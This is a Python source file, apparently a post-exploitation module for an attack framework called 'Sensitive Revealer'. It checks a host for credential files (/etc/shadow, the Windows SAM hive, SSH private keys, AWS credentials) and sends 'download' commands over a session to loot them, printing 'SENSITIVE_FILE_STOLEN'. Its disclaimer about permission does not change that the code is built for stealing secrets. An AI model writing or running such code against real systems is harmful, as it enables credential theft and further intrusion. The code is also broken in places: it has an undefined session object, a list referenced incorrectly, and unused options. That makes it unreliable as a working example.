import pyfiglet
import os 
from collections import OrderedDict

MODULE_TYPE = "postexploit"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Sensitive Revealer',
            'Rank':'Good',
            'Platform':'Windows/Linux',
            'architectures':'x86/64 bit processors',
            'Description': 'Looks for existance of sensitive files / folders. ',
            'Note':'This is for educational purposes only, and you must have explicit permission to test any system.',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('RHOST', ('127.0.0.1', False, 'Target address.')),
                ('PORT', ('8080', True, 'Address port number'))
             
                ])
                }
    def logo(self):
    	title = 'Sensitive Revealer'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set RHOST <127.0.0.1> |  set PORT <port> ,then run")
   
    AUTO_LOOT_PATHS = [
    '/etc/passwd', '/etc/shadow', 'C:\\Windows\\System32\\config\\SAM',
    '~/.ssh/id_rsa', '~/.aws/credentials'
]
                
    def loot_sensitive(self):
      for path in AUTO_LOOT_PATHS:
        if os.path.exists(path):
            target_session.send(f"download {path}\n".encode())
            print("SENSITIVE_FILE_STOLEN", path)
        else:
            print(path + ' is Missing')
    def execute(self):
        url = self.info['Options']['RHOST'][0]
        port = self.info['Options']['PORT'][0]
        
        self.logo()
        self.loot_sensitive()
        return "[+] Searching for sensitive files on target ..."
    